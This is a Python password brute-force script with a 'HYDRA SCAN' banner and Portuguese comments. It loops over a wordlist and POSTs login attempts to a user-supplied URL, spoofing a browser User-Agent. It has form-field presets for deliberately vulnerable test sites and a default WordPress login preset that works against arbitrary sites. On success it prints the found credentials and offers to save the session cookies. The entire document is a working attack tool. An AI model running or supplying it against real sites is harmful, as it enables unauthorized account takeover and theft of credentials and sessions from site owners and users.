import requests
import os
from colorama import init, Fore, Style

# Inicializando o colorama
init(autoreset=True)

# Banner do script
print(Fore.LIGHTCYAN_EX + Style.BRIGHT + """
██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
███████║ ╚████╔╝ ██║  ██║██████╔╝███████║    ███████╗██║     ███████║██╔██╗ ██║
██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║    ╚════██║██║     ██╔══██║██║╚██╗██║
██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║    ███████║╚██████╗██║  ██║██║ ╚████║
╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
""")

# Solicitar a URL do website
url = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "Digite a URL do site de login: ").strip()

# Nome de usuário fixo, senha será obtida a partir da wordlist
username = input(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\nDigite o username: ").strip()
print("\n")

# Caminho do arquivo wordlist.txt na mesma pasta do script
wordlist_path = os.path.join(os.path.dirname(__file__), 'wordList.txt')

# User-Agent customizado para simular um navegador real
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# Iniciar uma sessão para manter os cookies
with requests.Session() as session:
    if os.path.exists(wordlist_path):
        with open(wordlist_path, 'r') as wordlist:
            for password in wordlist:
                password = password.strip()
                
                # Definir os dados de login conforme a URL
                if "vulnweb.com" in url:
                    login_data = {
                        'uname': username,
                        'pass': password,
                        'submit': 'Login'
                    }
                elif "testsparker.com" in url:
                    login_data = {
                        'username': username,
                        'password': password,
                        'Login': 'Login'
                    }
                elif "altoro.testfire.net" in url:
                    login_data = {
                        'j_username': username,
                        'j_password': password,
                        'submit': 'Login'
                    }
                elif "dvwa/login.php" in url:
                    login_data = {
                        'username': username,
                        'password': password,
                        'login-php-submit-button': 'Login'
                    }
                else:
                    login_data = {
                        'log': username,
                        'pwd': password,
                        'wp-submit': 'Log+In',
                        'redirect_to': url + '/wp-admin/',
                        'testcookie': '1'
                    }

                # Enviar a requisição POST
                response = session.post(url, data=login_data, headers=headers, allow_redirects=True)

                # Debugging: printar parte da resposta para verificar login bem-sucedido
                print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + f"Tentando login com: {username} | Senha: {password} - Código: {response.status_code}")

                # Se a senha for correta, o site pode retornar um status 200 com uma mensagem de sucesso
                if "Logout" in response.text or "Welcome" in response.text or "Dashboard" in response.text:
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + f"\n[+] Login bem-sucedido! Usuário: {username} | Senha: {password}\n")
                    break  # Para o loop ao encontrar a senha correta
            else:
                print(Fore.LIGHTRED_EX + "\n[-] Nenhuma senha funcionou. Tente outra wordlist.")
    else:
        print(Fore.LIGHTRED_EX + "Erro: O arquivo 'wordlist.txt' não foi encontrado!")

# Mostrar os cookies da sessão antes de perguntar se deseja salvar
print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "\n\nCookies da sessão")
for cookie in session.cookies:
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + f"{cookie.name}={cookie.value}")

# Perguntar se deseja salvar os cookies
salvar = input(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "\n\nDeseja salvar os cookies? (s/n): ").strip().lower()
if salvar == 's':
    with open('cookies.txt', 'w') as cookie_file:
        for cookie in session.cookies:
            cookie_file.write(f"{cookie.name}={cookie.value}\n")
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\nCookies salvos em: cookies.txt")
else:
    print(Fore.LIGHTRED_EX + "\nCookies não foram salvos.")

input(Fore.LIGHTRED_EX + "\n\n========== PRESSIONE ENTER PARA SAIR ==========\n")
